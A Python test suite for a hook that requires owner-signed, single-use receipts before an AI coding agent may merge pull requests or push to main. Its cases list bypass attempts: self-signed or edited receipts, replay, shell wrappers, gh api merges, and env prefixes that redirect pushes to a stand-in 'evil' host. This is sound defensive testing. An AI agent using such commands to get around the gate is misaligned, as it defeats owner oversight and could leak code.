#!/usr/bin/env python3
"""Pin the opt-in action-authority hook: off/advisory/enforce, signed+bound receipts, consume, fail-open."""

from __future__ import annotations

import json
import subprocess
import sys
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
from hooks.scripts import action_authority_gate as gate
from hooks.scripts.tests.receipt_hook_case import MERGE, PIN, PUSH, ReceiptHookCase
from hooks.scripts.tests.receipt_test_support import git, make_repo

ROOT = Path(__file__).resolve().parents[3]


class GateTests(ReceiptHookCase):
    """Drive the hook as a subprocess against the shared receipt fixture."""

    def test_only_explicit_off_is_silent(self) -> None:
        """`off` is silent, absence/blank use ON defaults, and invalid config is rejected."""
        self.configure("off")
        result = self.invoke("action_authority_gate", self.payload(MERGE))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, "", ""))
        self.assertEqual(self.reasons(), [])
        for value in (None, ""):
            with self.subTest(value=value):
                self.configure(value if value is not None else "")
                if value is None:
                    (self.repo / ".coderails/workflow.config.yaml").unlink()
                self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
        self.configure("yes")
        result = self.invoke("action_authority_gate", self.payload(MERGE))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(json.loads(result.stdout)["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertIn("config_rejected", result.stdout)
        self.assertEqual(self.reasons()[-2:], ["config_bad_value", "config_rejected"])

    def test_default_is_enforce_without_any_config_file(self) -> None:
        """No .coderails directory at all: an unreceipted merge and push to main are denied."""
        self.assertFalse((self.repo / ".coderails").exists())
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
        self.assertTrue(self.denied("action_authority_gate", self.payload(PUSH)))
        self.mint(PUSH, "git_push")
        self.assertFalse(self.denied("action_authority_gate", self.payload(PUSH)))

    def test_default_is_enforce_without_config_or_key(self) -> None:
        """(b) No config file at all, and a config lacking the key, deny merge, merge.py and push to main."""
        for value in (None, "other_key: 1\n"):
            if value:
                (self.repo / ".coderails").mkdir(exist_ok=True)
                (self.repo / ".coderails/workflow.config.yaml").write_text(value)
            for command in (MERGE, PUSH, "python3 scripts/merge.py 12"):
                with self.subTest(config=value, command=command):
                    self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
        self.assertNotIn("action_authority_bad_mode", self.reasons())

    def test_invalid_value_is_rejected(self) -> None:
        """A guarded action refuses a config value outside the schema enum."""
        self.configure("yes")
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
        self.assertEqual(self.reasons(), ["config_bad_value", "config_rejected"])

    def test_authority_denied_and_max_prs_refuse_even_with_a_valid_receipt(self) -> None:
        """(a) A valid signed receipt does not override authority.denied or a spent max_prs, and is not consumed."""
        self.grant(denied=["merge", "push_main"])
        self.mint(MERGE, "merge")
        self.mint(PUSH, "git_push", rid="r2")
        for command in (MERGE, PUSH):
            self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
        self.assertEqual(self.reasons(), ["denied_authority_denied", "denied_authority_denied"])
        self.assertFalse((self.loop / "s1/receipts/r1.consumed").exists())
        self.grant(denied=[], max_prs=0)
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
        self.assertEqual(self.reasons()[-1], "denied_max_prs_exceeded")

    def test_subagent_payload_is_the_same_session(self) -> None:
        """(d) A subagent call (agent_id/agent_type set, same session_id) uses the parent's receipt."""
        self.mint(MERGE, "merge")
        sub = self.payload(MERGE) | {"agent_id": "a-1", "agent_type": "loop-worker"}
        self.assertFalse(self.denied("action_authority_gate", sub))
        self.assertEqual(self.reasons(), ["trust_root_user_tier", "receipt_consumed"])

    def test_advisory_warns_and_traces_never_denies(self) -> None:
        """Advisory without a receipt: stderr warning plus a trace row, no denial."""
        self.configure("advisory")
        result = self.invoke("action_authority_gate", self.payload(MERGE))
        self.assertEqual((result.returncode, result.stdout), (0, ""))
        self.assertIn("advisory", result.stderr)
        self.assertEqual(self.reasons(), ["advisory_no_receipt"])

    def test_enforce_denies_without_receipt_and_allows_with_one_once(self) -> None:
        """(a)+(d) Enforce: denied without; allowed and consumed with a signed receipt; replay denied."""
        self.configure("enforce")
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
        self.mint(MERGE, "merge")
        self.assertFalse(self.denied("action_authority_gate", self.payload(MERGE)))
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
        expected = ["denied_no_receipt", "trust_root_user_tier", "receipt_consumed", "denied_consumed"]
        self.assertEqual(self.reasons(), expected)

    def test_self_minted_receipts_are_denied(self) -> None:
        """(b) Unsigned hand-written JSON, an agent-made key, and a body edited after signing are all denied."""
        self.configure("enforce")
        self.mint(MERGE, "merge", rid="unsigned", signature=None)
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
        self.mint(MERGE, "merge", session="s2", key=self.agent_key)
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE, "s2")))
        path = self.loop / "s3" / "receipts" / "edited.json"
        self.mint(MERGE, "merge", session="s3", rid="edited")
        path.write_text(path.read_text().replace("refs/heads/main", "refs/heads/release"))
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE, "s3")))
        self.assertEqual(self.reasons(), ["denied_signature_missing"])
        self.assertEqual(self.reasons("s2"), ["denied_signer_unknown"])
        self.assertEqual(self.reasons("s3"), ["denied_signature_invalid"])

    def test_missing_trust_root_is_denied(self) -> None:
        """No signers file at all: a validly signed receipt is still denied as trust_root_missing."""
        self.configure("enforce")
        self.mint(MERGE, "merge")
        (self.directory / "home" / ".coderails" / "keys" / "receipt_signers").unlink()
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE)))
        self.assertEqual(self.reasons(), ["denied_trust_root_missing"])

    def test_unknowable_binding_fails_closed(self) -> None:
        """(c) No origin, or a push with no resolvable source: denied binding_unknown even with a receipt."""
        self.configure("enforce")
        self.mint(PUSH, "git_push")
        git(self.repo, "remote", "remove", "origin")
        self.assertTrue(self.denied("action_authority_gate", self.payload(PUSH)))
        self.assertEqual(self.reasons(), ["denied_binding_unknown"])

    def test_stale_sha_and_wrong_ref_are_denied(self) -> None:
        """(c) HEAD moving after the mint is sha_mismatch; a receipt for main does not authorise release/x."""
        self.configure("enforce")
        self.mint(PUSH, "git_push")
        git(self.repo, "commit", "-q", "--allow-empty", "-m", "moved")
        self.assertTrue(self.denied("action_authority_gate", self.payload(PUSH)))
        self.assertEqual(self.reasons(), ["denied_sha_mismatch"])
        self.mint(PUSH, "git_push", rid="r2")
        self.assertTrue(self.denied("action_authority_gate", self.payload("git push origin main:release/x")))

    def test_refspec_source_is_bound_not_head(self) -> None:
        """(h) `git push origin feature:main` from main binds feature's sha: a HEAD-bound receipt is refused."""
        self.configure("enforce")
        git(self.repo, "branch", "feature")
        git(self.repo, "switch", "-q", "feature")
        git(self.repo, "commit", "-q", "--allow-empty", "-m", "feature work")
        git(self.repo, "switch", "-q", "main")
        command = "git push origin feature:main"
        head = git(self.repo, "rev-parse", "HEAD")
        self.mint(command, "git_push", artifact_sha=head)  # the HEAD-only (old) binding
        self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
        self.assertEqual(self.reasons(), ["denied_sha_mismatch"])
        self.mint(command, "git_push", rid="r2")  # binding computed from the refspec source
        self.assertFalse(self.denied("action_authority_gate", self.payload(command)))

    def test_enforce_refuses_different_args_foreign_session_and_unguarded(self) -> None:
        """Different args and a receipt minted for another session are refused; unguarded commands pass."""
        self.configure("enforce")
        self.mint(MERGE, "merge")
        self.assertTrue(self.denied("action_authority_gate", self.payload(f"gh pr merge 13 --squash {PIN}")))
        self.assertEqual(self.reasons(), ["denied_hash_mismatch"])
        self.mint(MERGE, "merge", session="s2", session_id="s1")  # foreign: lives in s2's dir, embeds s1
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE, "s2")))
        self.assertEqual(self.reasons("s2"), ["denied_foreign_session"])
        for command in ("ls -la", "gh pr create", "git status"):
            self.assertFalse(self.denied("action_authority_gate", self.payload(command)), command)
        subprocess.run(["git", "-C", str(self.repo), "symbolic-ref", "HEAD", "refs/heads/feature/x"], check=True)
        self.assertFalse(self.denied("action_authority_gate", self.payload("git push origin feature/x")))

    def test_enforce_guards_git_push_to_main(self) -> None:
        """A push on main needs a push receipt."""
        self.configure("enforce")
        self.assertTrue(self.denied("action_authority_gate", self.payload(PUSH)))
        self.mint(PUSH, "git_push")
        self.assertFalse(self.denied("action_authority_gate", self.payload(PUSH)))

    def test_hook_error_fails_open_with_reason(self) -> None:
        """An injected exception exits 0 without denying and traces action_authority_failed_open."""
        self.configure("enforce")
        payload = self.payload(MERGE)
        with (
            mock.patch.object(gate, "read_payload", return_value=payload),
            mock.patch.object(gate, "check_and_consume", side_effect=RuntimeError("boom")),
            mock.patch.object(gate, "binding", return_value={"repository": "r", "ref": "f", "sha": "s"}),
            mock.patch.dict("os.environ", {"CLAUDE_AGENTIC_LOOP_DIR": str(self.loop)}),
        ):
            self.assertEqual(gate.main(), 0)
        self.assertEqual(self.reasons(), ["action_authority_failed_open"])

    def test_a_different_session_id_is_a_different_session(self) -> None:
        """Only a different session_id matters (agent_id/agent_type do not): another session's receipt is refused."""
        self.configure("enforce")
        self.mint(MERGE, "merge", session="parent")
        self.assertTrue(self.denied("action_authority_gate", self.payload(MERGE, "worker")))
        self.assertEqual(self.reasons("worker"), ["denied_no_receipt"])

    def second_repo(self) -> Path:
        """A second repo with an origin, also on main."""
        return make_repo(self.directory / "other")

    def test_chained_second_guarded_op_needs_its_own_receipt(self) -> None:
        """A receipt for the first segment never authorises a chained second guarded operation."""
        self.configure("enforce")
        self.mint("git push origin feature", "git_push")
        git(self.repo, "branch", "feature")
        self.assertTrue(
            self.denied("action_authority_gate", self.payload("git push origin feature && git push origin main"))
        )
        chain = f"gh pr merge 1 {PIN} && gh pr merge 2 {PIN}"
        self.mint(f"gh pr merge 1 {PIN}", "merge", rid="r2")
        self.assertTrue(self.denied("action_authority_gate", self.payload(chain)))
        self.mint(f"gh pr merge 2 {PIN}", "merge", rid="r3")
        self.assertFalse(self.denied("action_authority_gate", self.payload(chain)))

    def test_cd_into_other_repo_binds_the_real_directory(self) -> None:
        """A receipt for `git push` in repoA does not authorise `cd repoB && git push`; one minted for repoB does."""
        self.configure("enforce")
        other = self.second_repo()
        self.mint(PUSH, "git_push")
        self.assertTrue(self.denied("action_authority_gate", self.payload(f"cd {other} && {PUSH}")))
        self.mint(PUSH, "git_push", cwd=other, rid="r2")
        self.assertFalse(self.denied("action_authority_gate", self.payload(f"cd {other} && {PUSH}")))

    def test_missing_session_denied_as_no_session_and_traced(self) -> None:
        """No session_id: deny code no_session, a trace row exists, no blank --session in the hint."""
        self.configure("enforce")
        payload = self.payload(PUSH)
        del payload["session_id"]
        result = self.invoke("action_authority_gate", payload)
        self.assertIn("no_session", result.stdout)
        self.assertNotIn("--session  ", result.stdout)
        self.assertEqual(self.reasons("_no_session"), ["denied_no_session"])

    def test_deny_hint_names_the_owner_run_mint(self) -> None:
        """The denial tells the agent the OWNER mints receipts at a terminal."""
        self.configure("enforce")
        out = self.invoke("action_authority_gate", self.payload(PUSH)).stdout
        self.assertIn("OWNER mints", out)
        self.assertIn("authority_keys.py init", out)

    def test_failed_open_row_carries_error_class_and_loop(self) -> None:
        """The failed-open row records the error class (hashed input) and stderr names the class and message."""
        self.configure("enforce")
        payload = self.payload(MERGE)
        with (
            mock.patch.object(gate, "read_payload", return_value=payload),
            mock.patch.object(gate, "read_authority", side_effect=ZeroDivisionError("boom")),
            mock.patch.dict("os.environ", {"CLAUDE_AGENTIC_LOOP_DIR": str(self.loop)}),
            mock.patch("sys.stderr") as err,
        ):
            self.assertEqual(gate.main(), 0)
        row = json.loads((self.loop / "s1" / "trace.jsonl").read_text().splitlines()[-1])
        self.assertEqual(row["reason_code"], "action_authority_failed_open")
        self.assertIn("error_class", row["inputs"])
        self.assertIn("ZeroDivisionError", "".join(c.args[0] for c in err.write.call_args_list))

    def test_one_receipt_cannot_authorise_two_identical_segments(self) -> None:
        """A single-use receipt is spent once: a chain repeating the same guarded command is denied."""
        self.configure("enforce")
        self.mint(PUSH, "git_push")
        chained = f"echo x; {PUSH} && {PUSH}"
        self.assertTrue(self.denied("action_authority_gate", self.payload(chained)))
        self.assertNotIn("denied_no_receipt", self.reasons())
        self.mint(PUSH, "git_push", rid="r2")
        self.mint(PUSH, "git_push", rid="r3")
        self.assertFalse(self.denied("action_authority_gate", self.payload(chained)))

    def test_concurrent_hooks_one_receipt_exactly_one_allowed(self) -> None:
        """Four parallel hook processes on one receipt: the O_EXCL claim decides, so one allows and three deny."""
        self.configure("enforce")
        self.mint(PUSH, "git_push")
        procs = [
            subprocess.Popen(
                [sys.executable, str(ROOT / "hooks/scripts/action_authority_gate.py")], stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, text=True, env=self.environment,
            )
            for _ in range(4)
        ]  # fmt: skip
        outs = [p.communicate(json.dumps(self.payload(PUSH)))[0] for p in procs]
        self.assertEqual(sum("deny" not in out for out in outs), 1)
        self.assertEqual(self.reasons().count("receipt_consumed"), 1)

    def test_common_wrappers_are_still_guarded(self) -> None:
        """Env prefix, env/sudo/time, subshell, brace group, bash -c and gh api merge need the same receipt."""
        self.configure("enforce")
        wrapped = [
            "FOO=1 git push origin main", "env git push origin main", "sudo git push origin main",
            "(git push origin main)", "{ git push origin main; }", "bash -c 'git push origin main'",
            'sh -c "git push origin main"', "time git push origin main",
        ]  # fmt: skip
        for command in wrapped:
            with self.subTest(command=command):
                self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
        for command in (
            "sudo gh pr merge 5", "(gh pr merge 5)", "gh api repos/o/r/pulls/5/merge -X PUT",
            "gh api -X PUT repos/o/r/pulls/5/merge", "gh api --method PUT -f sha=abc repos/o/r/pulls/5/merge",
            "gh api graphql -f query='mutation { mergePullRequest(input: {pullRequestId: \"x\"}) { id } }'",
            "gh api graphql -f query='mutation { enablePullRequestAutoMerge(input: {}) { id } }'",
        ):  # fmt: skip
            with self.subTest(command=command):
                self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
        self.mint(PUSH, "git_push")
        self.assertFalse(self.denied("action_authority_gate", self.payload("time git push origin main")))

    def test_env_prefix_cannot_ride_on_a_receipt(self) -> None:
        """Negative control: GIT_*/GH_* assignments retarget the action, so they are denied even with a receipt."""
        self.configure("enforce")
        self.mint(PUSH, "git_push")
        self.mint(MERGE, "merge", rid="r2")
        for command in (
            "GIT_DIR=/x git push origin main", "FOO=1 git push origin main", "env GIT_DIR=/x git push origin main",
            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil/x.git "
            "git push origin main", f"GH_REPO=evil/x {MERGE}",
        ):  # fmt: skip
            with self.subTest(command=command):
                self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
        self.assertEqual(set(self.reasons()), {"denied_binding_unknown"})
        self.assertFalse(self.denied("action_authority_gate", self.payload(PUSH)))  # the receipt was never spent

    def test_git_global_options_are_still_guarded(self) -> None:
        """`git -c k=v push`, `--no-pager`, `--git-dir=` and `-C dir` are matched as pushes and need a receipt."""
        self.configure("enforce")
        for command in (
            "git -c push.default=current push origin main", "git --no-pager push origin main",
            "git --git-dir=.git push origin main", "git -C . push origin main",
        ):  # fmt: skip
            with self.subTest(command=command):
                self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
        self.assertEqual(self.reasons().count("denied_no_receipt"), 1)  # only the clean -C form can be bound
        self.assertEqual(self.reasons().count("denied_binding_unknown"), 3)

    def test_ref_moved_earlier_in_the_same_command_is_denied(self) -> None:
        """Negative control: `git branch -f feature <sha> && git push origin feature:main` binds a stale sha."""
        self.configure("enforce")
        git(self.repo, "branch", "feature")
        command = "git branch -f feature HEAD && git push origin feature:main"
        self.mint("git push origin feature:main", "git_push")
        self.assertTrue(self.denied("action_authority_gate", self.payload(command)))
        self.assertEqual(self.reasons(), ["denied_state_mutated_before_guard"])
        self.assertFalse(self.denied("action_authority_gate", self.payload("git push origin feature:main")))

    def test_deny_hint_for_unbindable_command_names_the_exact_forms(self) -> None:
        """The denial for an unbindable merge says to pin the head sha."""
        self.configure("enforce")
        out = self.invoke("action_authority_gate", self.payload("gh pr merge 12")).stdout
        self.assertIn("--match-head-commit", out)

    def test_registered_after_existing_gates(self) -> None:
        """Pure append: the Bash group keeps its original order with the new hook last, timeout >= 5."""
        group = json.loads((ROOT / "hooks/hooks.json").read_text())["hooks"]["PreToolUse"][0]["hooks"]
        names = [item["command"].rsplit("/", 1)[1].rstrip('"') for item in group]
        self.assertEqual(
            names,
            [
                "destructive_bash_gate.py", "enforce_pr_workflow.py", "test_gate.py",
                "verification_volume_ceiling.py", "reviewer_bash_allowlist.py", "subagent_identity_gate.py",
                "action_authority_gate.py",
            ],
        )  # fmt: skip
        self.assertGreaterEqual(group[-1]["timeout"], 5)


if __name__ == "__main__":
    unittest.main()
